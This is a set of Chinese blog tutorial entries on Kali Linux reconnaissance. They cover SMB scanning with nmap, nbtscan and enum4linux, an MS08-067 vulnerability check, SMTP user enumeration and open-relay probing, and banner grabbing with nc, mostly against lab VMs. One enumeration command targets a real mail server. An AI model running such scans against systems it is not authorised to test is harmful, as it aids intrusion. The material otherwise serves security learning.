    <content><![CDATA[<h2 id="smb协议">1. SMB协议</h2>
<p>SMB（ServerMessage
Block）通信协议是微软（Microsoft）和英特尔(Intel)在1987年制定的协议，主要是作为Microsoft网络的通讯协议。SMB
是在会话层（session layer）和表示层（presentation
layer）以及小部分应用层（application
layer）的协议。SMB使用了NetBIOS的应用程序接口 （Application Program
Interface，简称API），一般端口使用为139，445。另外，它是一个开放性的协议，允许了协议扩展----
使得它变得更大而且复杂；大约有65个最上层的作业，而每个作业都超过120个函数，甚至Windows
NT也没有全部支持到，最近微软又把 SMB 改名为 CIFS（CommonInternet File
System），并且加入了许多新的特色。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211204170613711-370436194.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211204170635688-1341990192.png" /></p>
<h2 id="smb扫描发现漏洞">2. SMB扫描（发现漏洞）</h2>
<h3 id="nmap">1、nmap</h3>
<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali/Desktop/Tools]</span><br><span class="line">└─<span class="comment"># nmap -v -p139,445 10.10.10.129          </span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-04 04:08 EST</span><br><span class="line">Initiating ARP Ping Scan at 04:08</span><br><span class="line">Scanning 10.10.10.129 [1 port]</span><br><span class="line">Completed ARP Ping Scan at 04:08, 0.06s elapsed (1 total hosts)</span><br><span class="line">Initiating Parallel DNS resolution of 1 host. at 04:08</span><br><span class="line">Completed Parallel DNS resolution of 1 host. at 04:08, 0.02s elapsed</span><br><span class="line">Initiating SYN Stealth Scan at 04:08</span><br><span class="line">Scanning 10.10.10.129 [2 ports]</span><br><span class="line">Discovered open port 139/tcp on 10.10.10.129</span><br><span class="line">Discovered open port 445/tcp on 10.10.10.129</span><br><span class="line">Completed SYN Stealth Scan at 04:08, 0.04s elapsed (2 total ports)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.129</span><br><span class="line">Host is up (0.00026s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">139/tcp open  netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line">MAC Address: 00:0C:29:DE:5D:BA (VMware)</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 0.34 seconds</span><br><span class="line">           Raw packets sent: 3 (116B) | Rcvd: 3 (116B)</span><br><span class="line">                                                                                           </span><br><span class="line">┌──(root💀kali)-[/home/kali/Desktop/Tools]</span><br><span class="line">└─<span class="comment"># nmap -v -p139,445 10.10.10.131</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-04 04:09 EST</span><br><span class="line">Initiating ARP Ping Scan at 04:09</span><br><span class="line">Scanning 10.10.10.131 [1 port]</span><br><span class="line">Completed ARP Ping Scan at 04:09, 0.06s elapsed (1 total hosts)</span><br><span class="line">Initiating Parallel DNS resolution of 1 host. at 04:09</span><br><span class="line">Completed Parallel DNS resolution of 1 host. at 04:09, 0.01s elapsed</span><br><span class="line">Initiating SYN Stealth Scan at 04:09</span><br><span class="line">Scanning 10.10.10.131 [2 ports]</span><br><span class="line">Discovered open port 139/tcp on 10.10.10.131</span><br><span class="line">Discovered open port 445/tcp on 10.10.10.131</span><br><span class="line">Completed SYN Stealth Scan at 04:09, 0.04s elapsed (2 total ports)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.131</span><br><span class="line">Host is up (0.00038s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">139/tcp open  netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line">MAC Address: 00:0C:29:76:04:88 (VMware)</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 0.25 seconds</span><br><span class="line">           Raw packets sent: 3 (116B) | Rcvd: 3 (116B)</span><br></pre></td></tr></table></figure>
<p><strong>高级扫描，依据服务识别系统</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali/Desktop/Tools]</span><br><span class="line">└─<span class="comment"># nmap 10.10.10.131 -p 139,445 --script=smb-os-discovery.nse</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-04 04:11 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.131</span><br><span class="line">Host is up (0.00032s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">139/tcp open  netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line">MAC Address: 00:0C:29:76:04:88 (VMware)</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows XP (Windows 2000 LAN Manager)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_xp::-</span><br><span class="line">|   Computer name: xpsp3</span><br><span class="line">|   NetBIOS computer name: XPSP3\x00</span><br><span class="line">|   Domain name: ujs.com</span><br><span class="line">|   Forest name: ujs.com</span><br><span class="line">|   FQDN: xpsp3.ujs.com</span><br><span class="line">|_  System time: 2021-12-04T17:11:24+08:00</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 1.04 seconds  </span><br></pre></td></tr></table></figure>
<p><strong>检查是否存在已知漏洞</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali/Desktop/Tools]</span><br><span class="line">└─<span class="comment"># nmap -v -p139,445 10.10.10.131 --script=smb-check-vulns --script-args=unsafe=1</span></span><br></pre></td></tr></table></figure>
<p>指定脚本参数unsafe=1破坏性扫描，即可发一些有破坏性的数据包（可能对目标造成损害，如宕机），safe=1反之，扫描结果如果是：Host
is down ,这可能是目标安装有防火墙所致，可加参数-Pn再次测试</p>
<p><strong>或针对某一漏洞探测是否有效</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/usr/share/nmap/scripts]</span><br><span class="line">└─<span class="comment"># nmap -v -p139,445  --script=smb-vuln-ms08-067.nse  10.10.10.131 </span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-04 04:24 EST</span><br><span class="line">NSE: Loaded 1 scripts <span class="keyword">for</span> scanning.</span><br><span class="line">NSE: Script Pre-scanning.</span><br><span class="line">Initiating NSE at 04:24</span><br><span class="line">Completed NSE at 04:24, 0.00s elapsed</span><br><span class="line">Initiating ARP Ping Scan at 04:24</span><br><span class="line">Scanning 10.10.10.131 [1 port]</span><br><span class="line">Completed ARP Ping Scan at 04:24, 0.12s elapsed (1 total hosts)</span><br><span class="line">Initiating Parallel DNS resolution of 1 host. at 04:24</span><br><span class="line">Completed Parallel DNS resolution of 1 host. at 04:24, 4.01s elapsed</span><br><span class="line">Initiating SYN Stealth Scan at 04:24</span><br><span class="line">Scanning 10.10.10.131 [2 ports]</span><br><span class="line">Discovered open port 445/tcp on 10.10.10.131</span><br><span class="line">Discovered open port 139/tcp on 10.10.10.131</span><br><span class="line">Completed SYN Stealth Scan at 04:24, 0.05s elapsed (2 total ports)</span><br><span class="line">NSE: Script scanning 10.10.10.131.</span><br><span class="line">Initiating NSE at 04:24</span><br><span class="line">Completed NSE at 04:25, 17.03s elapsed</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.131</span><br><span class="line">Host is up (0.00036s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">139/tcp open  netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line">MAC Address: 00:0C:29:76:04:88 (VMware)</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-vuln-ms08-067: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Microsoft Windows system vulnerable to remote code execution (MS08-067)</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2008-4250</span><br><span class="line">|           The Server service <span class="keyword">in</span> Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,</span><br><span class="line">|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary</span><br><span class="line">|           code via a crafted RPC request that triggers the overflow during path canonicalization.</span><br><span class="line">|           </span><br><span class="line">|     Disclosure <span class="built_in">date</span>: 2008-10-23</span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250</span><br><span class="line">|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx</span><br><span class="line"></span><br><span class="line">NSE: Script Post-scanning.</span><br><span class="line">Initiating NSE at 04:25</span><br><span class="line">Completed NSE at 04:25, 0.00s elapsed</span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 21.56 seconds</span><br><span class="line">           Raw packets sent: 3 (116B) | Rcvd: 3 (116B)</span><br></pre></td></tr></table></figure>
<h3 id="nbtscan">2、nbtscan</h3>
<p><strong>帮助信息</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/usr/share/nmap/scripts]</span><br><span class="line">└─<span class="comment"># nbtscan -h                                                     </span></span><br><span class="line"><span class="string">&quot;Human-readable service names&quot;</span> (-h) option cannot be used without verbose (-v) option.</span><br><span class="line">Usage:</span><br><span class="line">nbtscan [-v] [-d] [-e] [-l] [-t <span class="built_in">timeout</span>] [-b bandwidth] [-r] [-q] [-s separator] [-m retransmits] (-f filename)|(&lt;scan_range&gt;) </span><br><span class="line">        -v              verbose output. Print all names received</span><br><span class="line">                        from each host</span><br><span class="line">        -d              dump packets. Print whole packet contents.</span><br><span class="line">        -e              Format output <span class="keyword">in</span> /etc/hosts format.</span><br><span class="line">        -l              Format output <span class="keyword">in</span> lmhosts format.</span><br><span class="line">                        Cannot be used with -v, -s or -h options.</span><br><span class="line">        -t <span class="built_in">timeout</span>      <span class="built_in">wait</span> <span class="built_in">timeout</span> milliseconds <span class="keyword">for</span> response.</span><br><span class="line">                        Default 1000.</span><br><span class="line">        -b bandwidth    Output throttling. Slow down output</span><br><span class="line">                        so that it uses no more that bandwidth bps.</span><br><span class="line">                        Useful on slow links, so that ougoing queries</span><br><span class="line">                        don<span class="string">&#x27;t get dropped.</span></span><br><span class="line"><span class="string">        -r              use local port 137 for scans. Win95 boxes</span></span><br><span class="line"><span class="string">                        respond to this only.</span></span><br><span class="line"><span class="string">                        You need to be root to use this option on Unix.</span></span><br><span class="line"><span class="string">        -q              Suppress banners and error messages,</span></span><br><span class="line"><span class="string">        -s separator    Script-friendly output. Don&#x27;</span>t <span class="built_in">print</span></span><br><span class="line">                        column and record headers, separate fields with separator.</span><br><span class="line">        -h              Print human-readable names <span class="keyword">for</span> services.</span><br><span class="line">                        Can only be used with -v option.</span><br><span class="line">        -m retransmits  Number of retransmits. Default 0.</span><br><span class="line">        -f filename     Take IP addresses to scan from file filename.</span><br><span class="line">                        -f - makes nbtscan take IP addresses from stdin.</span><br><span class="line">        &lt;scan_range&gt;    what to scan. Can either be single IP</span><br><span class="line">                        like 192.168.1.1 or</span><br><span class="line">                        range of addresses <span class="keyword">in</span> one of two forms: </span><br><span class="line">                        xxx.xxx.xxx.xxx/xx or xxx.xxx.xxx.xxx-xxx.</span><br><span class="line">Examples:</span><br><span class="line">        nbtscan -r 192.168.1.0/24</span><br><span class="line">                Scans the whole C-class network.</span><br><span class="line">        nbtscan 192.168.1.25-137</span><br><span class="line">                Scans a range from 192.168.1.25 to 192.168.1.137</span><br><span class="line">        nbtscan -v -s : 192.168.1.0/24</span><br><span class="line">                Scans C-class network. Prints results <span class="keyword">in</span> script-friendly</span><br><span class="line">                format using colon as field separator.</span><br><span class="line">                Produces output like that:</span><br><span class="line">                192.168.0.1:NT_SERVER:00U</span><br><span class="line">                192.168.0.1:MY_DOMAIN:00G</span><br><span class="line">                192.168.0.1:ADMINISTRATOR:03U</span><br><span class="line">                192.168.0.2:OTHER_BOX:00U</span><br><span class="line">                ...</span><br><span class="line">        nbtscan -f iplist</span><br><span class="line">                Scans IP addresses specified <span class="keyword">in</span> file iplist.                                                                                         </span><br></pre></td></tr></table></figure>
<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/usr/share/nmap/scripts]</span><br><span class="line">└─<span class="comment"># nbtscan -r 10.10.10.131                                                            </span></span><br><span class="line">Doing NBT name scan <span class="keyword">for</span> addresses from 10.10.10.131</span><br><span class="line"></span><br><span class="line">IP address       NetBIOS Name     Server    User             MAC address      </span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line">10.10.10.131     XPSP3            &lt;server&gt;  &lt;unknown&gt;        00:0c:29:76:04:88</span><br><span class="line">                                                                                           </span><br><span class="line">┌──(root💀kali)-[/usr/share/nmap/scripts]</span><br><span class="line">└─<span class="comment"># nbtscan -r 10.10.10.129</span></span><br><span class="line">Doing NBT name scan <span class="keyword">for</span> addresses from 10.10.10.129</span><br><span class="line"></span><br><span class="line">IP address       NetBIOS Name     Server    User             MAC address      </span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line">10.10.10.129     OWASPBWA         &lt;server&gt;  OWASPBWA         00:00:00:00:00:00</span><br><span class="line">                                                                                           </span><br><span class="line">┌──(root💀kali)-[/usr/share/nmap/scripts]</span><br><span class="line">└─<span class="comment"># nbtscan -r 10.10.10.0/24　　　　　　　　</span></span><br><span class="line">Doing NBT name scan <span class="keyword">for</span> addresses from 10.10.10.0/24</span><br><span class="line"></span><br><span class="line">IP address       NetBIOS Name     Server    User             MAC address      </span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line">10.10.10.0      Sendto failed: Permission denied</span><br><span class="line">10.10.10.1       LAPTOP-L73NVBKU            &lt;unknown&gt;        00:50:56:c0:00:08</span><br><span class="line">10.10.10.131     XPSP3            &lt;server&gt;  &lt;unknown&gt;        00:0c:29:76:04:88</span><br><span class="line">10.10.10.135     &lt;unknown&gt;                  &lt;unknown&gt;        </span><br><span class="line">10.10.10.129     OWASPBWA         &lt;server&gt;  OWASPBWA         00:00:00:00:00:00</span><br><span class="line">10.10.10.255    Sendto failed: Permission denied</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>参数 -r：使用本地137端口来扫描，兼容性最强</strong></li>
<li><strong>nbtscan 支持跨网段的MAC扫描</strong></li>
</ul>
<h3 id="enum4linux">3、enum4linux</h3>
<p><strong>不支持网段扫描，但结果很详细</strong></p>
<p><strong>帮助信息</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">    ┌──(root💀kali)-[/usr/share/nmap/scripts]</span><br><span class="line">    └─<span class="comment"># enum4linux -h</span></span><br><span class="line">    enum4linux v0.8.9 (http://labs.portcullis.co.uk/application/enum4linux/)</span><br><span class="line">    Copyright (C) 2011 Mark Lowe (mrl@portcullis-security.com)</span><br><span class="line">    </span><br><span class="line">    Simple wrapper around the tools <span class="keyword">in</span> the samba package to provide similar </span><br><span class="line">    functionality to enum.exe (formerly from www.bindview.com).  Some additional </span><br><span class="line">    features such as RID cycling have also been added <span class="keyword">for</span> convenience.</span><br><span class="line">    </span><br><span class="line">    Usage: ./enum4linux.pl [options] ip</span><br><span class="line">    </span><br><span class="line">    Options are (like <span class="string">&quot;enum&quot;</span>):</span><br><span class="line">        -U        get userlist</span><br><span class="line">        -M        get machine list*</span><br><span class="line">        -S        get sharelist</span><br><span class="line">        -P        get password policy information</span><br><span class="line">        -G        get group and member list</span><br><span class="line">        -d        be detailed, applies to -U and -S</span><br><span class="line">        -u user   specify username to use (default <span class="string">&quot;&quot;</span>)  </span><br><span class="line">        -p pass   specify password to use (default <span class="string">&quot;&quot;</span>)   </span><br><span class="line">    </span><br><span class="line">    The following options from enum.exe aren<span class="string">&#x27;t implemented: -L, -N, -D, -f</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Additional options:</span></span><br><span class="line"><span class="string">        -a        Do all simple enumeration (-U -S -G -P -r -o -n -i).</span></span><br><span class="line"><span class="string">                  This opion is enabled if you don&#x27;</span>t provide any other options.</span><br><span class="line">        -h        Display this <span class="built_in">help</span> message and <span class="built_in">exit</span></span><br><span class="line">        -r        enumerate <span class="built_in">users</span> via RID cycling</span><br><span class="line">        -R range  RID ranges to enumerate (default: 500-550,1000-1050, implies -r)</span><br><span class="line">        -K n      Keep searching RIDs <span class="keyword">until</span> n consective RIDs don<span class="string">&#x27;t correspond to</span></span><br><span class="line"><span class="string">                  a username.  Impies RID range ends at 999999. Useful </span></span><br><span class="line"><span class="string">                  against DCs.</span></span><br><span class="line"><span class="string">        -l        Get some (limited) info via LDAP 389/TCP (for DCs only)</span></span><br><span class="line"><span class="string">        -s file   brute force guessing for share names</span></span><br><span class="line"><span class="string">        -k user   User(s) that exists on remote system (default: administrator,guest,krbtgt,domain admins,root,bin,none)</span></span><br><span class="line"><span class="string">                  Used to get sid with &quot;lookupsid known_username&quot;</span></span><br><span class="line"><span class="string">                  Use commas to try several users: &quot;-k admin,user1,user2&quot;</span></span><br><span class="line"><span class="string">        -o        Get OS information</span></span><br><span class="line"><span class="string">        -i        Get printer information</span></span><br><span class="line"><span class="string">        -w wrkg   Specify workgroup manually (usually found automatically)</span></span><br><span class="line"><span class="string">        -n        Do an nmblookup (similar to nbtstat)</span></span><br><span class="line"><span class="string">        -v        Verbose.  Shows full commands being run (net, rpcclient, etc.)</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    RID cycling should extract a list of users from Windows (or Samba) hosts </span></span><br><span class="line"><span class="string">    which have RestrictAnonymous set to 1 (Windows NT and 2000), or &quot;Network </span></span><br><span class="line"><span class="string">    access: Allow anonymous SID/Name translation&quot; enabled (XP, 2003).</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    NB: Samba servers often seem to have RIDs in the range 3000-3050.</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Dependancy info: You will need to have the samba package installed as this </span></span><br><span class="line"><span class="string">    script is basically just a wrapper around rpcclient, net, nmblookup and </span></span><br><span class="line"><span class="string">    smbclient.  Polenum from http://labs.portcullis.co.uk/application/polenum/ </span></span><br><span class="line"><span class="string">    is required to get Password Policy info.                                                               </span></span><br><span class="line"><span class="string">```                       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">**示例：**</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">```bash</span></span><br><span class="line"><span class="string">    **┌──(root💀kali)** **-[/usr/share/nmap/ scripts]</span></span><br><span class="line"><span class="string">    └─# enum4linux -a 10.10.10.129**</span></span><br><span class="line"><span class="string">    Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Dec  4 04:42:51 2021</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">     ========================== </span></span><br><span class="line"><span class="string">    |    Target Information    |</span></span><br><span class="line"><span class="string">     ========================== </span></span><br><span class="line"><span class="string">    Target ........... 10.10.10.129</span></span><br><span class="line"><span class="string">    RID Range ........ 500-550,1000-1050</span></span><br><span class="line"><span class="string">    Username ......... &#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    Password ......... &#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">     ==================================================== </span></span><br><span class="line"><span class="string">    |    Enumerating Workgroup/Domain on 10.10.10.129    |</span></span><br><span class="line"><span class="string">     ==================================================== </span></span><br><span class="line"><span class="string">    [+] Got domain/workgroup name: WORKGROUP</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">     ============================================ </span></span><br><span class="line"><span class="string">    |    **Nbtstat Information for 10.10.10.129 **   |　　　　　　#扫出来的服务</span></span><br><span class="line"><span class="string">     ============================================ </span></span><br><span class="line"><span class="string">    Looking up status of 10.10.10.129</span></span><br><span class="line"><span class="string">            OWASPBWA        &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service</span></span><br><span class="line"><span class="string">            OWASPBWA        &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service</span></span><br><span class="line"><span class="string">            OWASPBWA        &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service</span></span><br><span class="line"><span class="string">            ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser</span></span><br><span class="line"><span class="string">            WORKGROUP       &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser</span></span><br><span class="line"><span class="string">            WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections</span></span><br><span class="line"><span class="string">            WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">            MAC Address = 00-00-00-00-00-00</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">     ===================================== </span></span><br><span class="line"><span class="string">    |    Session Check on 10.10.10.129    |</span></span><br><span class="line"><span class="string">     ===================================== </span></span><br><span class="line"><span class="string">    [E] Server doesn&#x27;</span>t allow session using username <span class="string">&#x27;&#x27;</span>, password <span class="string">&#x27;&#x27;</span>.  Aborting remainder of tests.</span><br><span class="line">    **┌──(root💀kali) -[/usr/share/nmap/scripts]</span><br><span class="line">    └─<span class="comment"># enum4linux -a 10.10.10.131   **                           #注意扫描结果</span></span><br><span class="line">    Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Dec  4 04:42:59 2021</span><br><span class="line">    </span><br><span class="line">     ========================== </span><br><span class="line">    |    Target Information    |</span><br><span class="line">     ========================== </span><br><span class="line">    Target ........... 10.10.10.131</span><br><span class="line">    RID Range ........ 500-550,1000-1050</span><br><span class="line">    Username ......... <span class="string">&#x27;&#x27;</span></span><br><span class="line">    Password ......... <span class="string">&#x27;&#x27;</span></span><br><span class="line">    Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">     ==================================================== </span><br><span class="line">    |    Enumerating Workgroup/Domain on 10.10.10.131    |</span><br><span class="line">     ==================================================== **[ +] Got domain/workgroup name: UJS</span><br><span class="line">    </span><br><span class="line">     **============================================ </span><br><span class="line">    **|    Nbtstat Information <span class="keyword">for</span> 10.10.10.131    |**</span><br><span class="line">     ============================================ </span><br><span class="line">    Looking up status of 10.10.10.131</span><br><span class="line">            XPSP3           &lt;00&gt; -         M &lt;ACTIVE&gt;  Workstation Service</span><br><span class="line">            XPSP3           &lt;20&gt; -         M &lt;ACTIVE&gt;  File Server Service</span><br><span class="line">            UJS             &lt;00&gt; - &lt;GROUP&gt; M &lt;ACTIVE&gt;  Domain/Workgroup Name</span><br><span class="line">            UJS             &lt;1e&gt; - &lt;GROUP&gt; M &lt;ACTIVE&gt;  Browser Service Elections</span><br><span class="line">            UJS             &lt;1d&gt; -         M &lt;ACTIVE&gt;  Master Browser</span><br><span class="line">            ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; M &lt;ACTIVE&gt;  Master Browser</span><br><span class="line">    </span><br><span class="line">            MAC Address = 00-0C-29-76-04-88</span><br><span class="line">    </span><br><span class="line">     ===================================== </span><br><span class="line">    |    Session Check on 10.10.10.131    |</span><br><span class="line">     ===================================== </span><br><span class="line">    [E] Server doesn<span class="string">&#x27;t allow session using username &#x27;</span><span class="string">&#x27;, password &#x27;</span><span class="string">&#x27;.  Aborting remainder of tests.</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>SMB 扫描</tag>
      </tags>
  </entry>
  <entry>
    <title>主动信息收集之SMTP扫描</title>
    <url>/2021/12/04/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8BSMTP%E6%89%AB%E6%8F%8F/</url>
    <content><![CDATA[<h2 id="smtp协议">1. SMTP协议</h2>
<p>SMTP是一种提供可靠且有效的电子邮件传输的协议。SMTP是建立在FTP文件传输服务上的一种邮件服务，主要用于系统之间的邮件信息传递，并提供有关来信的通知。SMTP独立于特定的传输子系统，且只需要可靠有序的数据流信道支持，SMTP的重要特性之一是其能跨越网络传输邮件，即"SMTP邮件中继"。使用SMTP，可实现相同网络处理进程之间的邮件传输，也可通过中继器或网关实现某处理进程与其他网络之间的邮件传输。</p>
<h2 id="smtp扫描发现邮箱">2. SMTP扫描（发现邮箱）</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -nv 10.10.10.129 25</span><br><span class="line"></span><br><span class="line">VRFY root <span class="comment">#nc连接之后使用该命令检测是否存在root账户</span></span><br><span class="line"></span><br><span class="line">nmap smtp.163.com -p 25 --script=enum-users.nse  \--script-args=smpt-enum-</span><br><span class="line">users.methods=&#123;VRFY&#125; <span class="comment">#枚举用户账号脚本，脚本参数指定有什么方式去验证</span></span><br><span class="line"></span><br><span class="line">nmap smtp.163.com -p 25 --script=smtp-open-relay.nse</span><br><span class="line"><span class="comment">#开放攻击（即别人可以用你的邮件服务器向其他人发邮件（钓鱼）），一般情况下该权限只有合法用户拥有</span></span><br><span class="line"></span><br><span class="line">smtp-user-enum -M VRFY -U users.txt -t 10.10.10.129</span><br></pre></td></tr></table></figure>
<p><strong>待补 ……</strong></p>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>SMTP 扫描</tag>
      </tags>
  </entry>
  <entry>
    <title>主动信息收集之服务扫描</title>
    <url>/2021/11/30/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F/</url>
    <content><![CDATA[<h2 id="服务扫描">1. 服务扫描</h2>
<p><strong>识别开放端口，上运行的应用</strong></p>
<ul>
<li><strong>依据识别的应用找对应纰漏的漏洞
(特别是一些老版本应用)</strong></li>
</ul>
<p><strong>识别目标操作系统类型，版本等</strong></p>
<ul>
<li><strong>依据识别结果，测试是否缺少相应补丁等</strong></li>
</ul>
<p><strong>方法</strong></p>
<ul>
<li><strong>Banner捕获，注意该结果不一定准确(管理员可伪造，迷惑扫描者)</strong></li>
<li><strong>服务识别（指纹信息）</strong></li>
<li><strong>操作系统识别</strong></li>
<li><strong>SNMP分析，如配置存在问题等</strong></li>
<li><strong>防火墙识别</strong></li>
</ul>
<p><strong>Banner</strong></p>
<ul>
<li><strong>软件开发商</strong></li>
<li><strong>软件名称</strong></li>
<li><strong>服务类型</strong></li>
<li><strong>版本号</strong></li>
<li><strong>直接发现已知漏洞和弱点</strong></li>
<li><strong>与目标系统端口建立完整连接可直接获取banner</strong></li>
</ul>
<p><strong>另类服务识别方法</strong></p>
<ul>
<li><strong>特征行为和响应字段</strong></li>
<li><strong>不同的响应可用于识别底层操作系统（如，Linux系统和Windows系统的ping包时不同的）</strong></li>
</ul>
<p><strong>SNMP</strong></p>
<p><strong>待补 ……</strong></p>
<h2 id="服务扫描获取-banner">2. 服务扫描获取 banner</h2>
<h3 id="nc">1、nc</h3>
<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/ kali]</span><br><span class="line">└─<span class="comment"># nc -nv  10.10.10.129 21</span></span><br><span class="line">(UNKNOWN) [10.10.10.129] 21 (ftp) open</span><br><span class="line">220 (vsFTPd 2.2.2)　　　　　　　　　　　　<span class="comment">#vsFTPd连版本都得到了……</span></span><br><span class="line">^C</span><br><span class="line">                                                                                          </span><br><span class="line">┌──(root💀kali)-[/home/ kali]</span><br><span class="line">└─<span class="comment"># nc -nv  10.10.10.129 22                                                           </span></span><br><span class="line">(UNKNOWN) [10.10.10.129] 22 (ssh) open</span><br><span class="line">SSH- 2.0-OpenSSH_5.3p1 Debian-3ubuntu4　　　　　　<span class="comment">#操作系统+服务</span></span><br><span class="line">^C</span><br><span class="line">                                                                                          </span><br><span class="line">┌──(root💀kali)-[/home/ kali]</span><br><span class="line">└─<span class="comment"># nc -nv  10.10.10.129 23                                                           </span></span><br><span class="line">(UNKNOWN) [10.10.10.129] 23 (telnet) : Connection refused</span><br></pre></td></tr></table></figure>
<h3 id="python脚本">2、Python脚本</h3>
